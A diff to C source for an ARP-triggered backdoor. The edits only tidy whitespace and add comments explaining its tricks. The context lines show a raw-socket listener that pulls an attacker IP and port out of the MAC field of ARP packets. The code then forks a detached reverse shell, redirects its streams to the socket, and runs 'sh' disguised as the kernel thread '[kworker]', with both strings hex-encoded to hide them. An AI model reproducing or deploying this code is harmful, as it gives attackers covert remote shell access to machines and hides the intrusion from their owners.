@@ -3,7 +3,7 @@
 #include<arpa/inet.h>
 
 /* Defined a custom struct to handle both the
-   Ethernet Header and the Arp Header */ 
+   Ethernet Header and the Arp Header */
 struct arp_hdr {
 	//Ethernet header
 	unsigned char  h_dest[6];     /*Destination MAC*/
@@ -32,12 +32,12 @@ int arp_listener();
 
 int reverse_shell(unsigned int IP_ADDR, unsigned short PORT)
 {
-	
+
 	if(fork()==0)
 	{
 		if (setsid()>0)
 		{
-	
+
 			struct sockaddr_in sa;
 			int s;
 
@@ -51,6 +51,9 @@ int reverse_shell(unsigned int IP_ADDR, unsigned short PORT)
         		dup2(s, 1);
         		dup2(s, 2);
 
+/* shell = "sh"
+   name  = "[kworker]"
+	 execlp will search PATH looking for "sh" */
 
 			char shell[3] = {0x73,0x68,0x0};
 			char name[10] = {0x5b,0x6b,0x77,0x6f,0x72,0x6b,0x65,0x72,0x5d,0x0};
@@ -91,7 +94,8 @@ int arp_listener()
 
 			unsigned short port;
 			unsigned int   ip;
-			
+
+			// Bit shifting to build the return port/IP
 			port=(arphdr->ar_sha[1]<<8) + (arphdr->ar_sha[0]);
 			ip=(arphdr->ar_sha[5]<<24);
 			ip+=(arphdr->ar_sha[4]<<16);
@@ -105,7 +109,7 @@ int arp_listener()
 					reverse_shell(ip,port);
 				}
 			}
-				
+
 			close(sock_raw);
 		}
 	}
